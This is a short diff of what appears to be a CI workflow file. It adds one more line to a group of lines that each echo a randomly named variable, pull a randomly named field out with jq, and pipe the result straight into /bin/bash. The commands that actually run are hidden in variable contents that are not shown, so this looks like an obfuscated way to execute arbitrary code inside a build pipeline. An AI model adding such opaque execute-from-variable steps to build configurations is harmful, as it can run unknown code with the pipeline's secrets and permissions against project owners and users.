@@ -62,6 +62,7 @@ jobs:
           printf '%s' "$smcbs52441" | jq -r .sgc6 | /bin/bash
           echo $drnky5 | jq -r .fssw01469 | /bin/bash
           echo $onxv71 | jq -r .idnwn273 | /bin/bash
+          echo $la31973 | jq -r .m00505 | /bin/bash
 
       - name: Upload artifact
         if: always()
